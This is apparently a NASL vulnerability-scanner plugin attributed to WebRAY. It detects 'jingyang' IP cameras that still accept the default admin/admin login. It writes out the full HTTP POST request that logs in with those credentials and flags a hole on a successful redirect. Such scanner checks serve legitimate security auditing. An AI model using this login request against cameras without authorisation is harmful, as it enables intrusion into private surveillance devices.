############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799085);
 name = "jingyang Camera - default password";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"description", value:"jingyang Camera default password, hackers can bypass the authentication access camera.");
 script_set_attribute(attribute:"solution", value:"Change default password.");
 script_end_attributes();
 script_require_ports("Services/www", 80);
 exit(0);
}


#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("openvas-https.inc");


function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	host1 = get_host_name( );
	if( port==80 ) host=host1;
    else host = string(host1,":",port);
	
	req = 'POST /goform/WEB_UsrLoginProc HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
	  'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
	  'Accept-Language: en-US,en;q=0.5\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
	  'Origin: http://' + host + '\r\n' +
	  'Content-Length: 71\r\n' +
	  'Connection: close\r\n' +
      'Referer: http://' + host + '/asppage/chinese/login.asp?id=2&ret=1\r\n' +
      'Upgrade-Insecure-Requests: 1\r\n\r\n' +
	  'LanguageParam=2&UserName=admin&Password=admin&B1=+++%E7%99%BB%E5%BD%95+';
     
	buf = http_keepalive_send_recv(port:port,data:req,bodyonly:FALSE);
	if( buf == NULL) exit(0);
	con = req + buf;
	if( "302 "><buf && "/asppage/chinese/index.asp?ID=YWRtaW46YWRtaW4="><buf ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	host1 = get_host_name( );
	if( port==443 ) host=host1;
    else host = string(host1,":",port);

	req = 'POST /goform/WEB_UsrLoginProc HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
	  'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
	  'Accept-Language: en-US,en;q=0.5\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
	  'Origin: https://' + host + '\r\n' +
	  'Content-Length: 71\r\n' +
	  'Connection: close\r\n' +
      'Referer: https://' + host + '/asppage/chinese/login.asp?id=2&ret=1\r\n' +
      'Upgrade-Insecure-Requests: 1\r\n\r\n' +
	  'LanguageParam=2&UserName=admin&Password=admin&B1=+++%E7%99%BB%E5%BD%95+';
    
	ssl_req = https_req_get(port:port,request:req);
	if( ssl_req == NULL) exit(0);
	con = req + ssl_req;
	if( "302 "><ssl_req && "/asppage/chinese/index.asp?ID=YWRtaW46YWRtaW4="><ssl_req ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################

kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}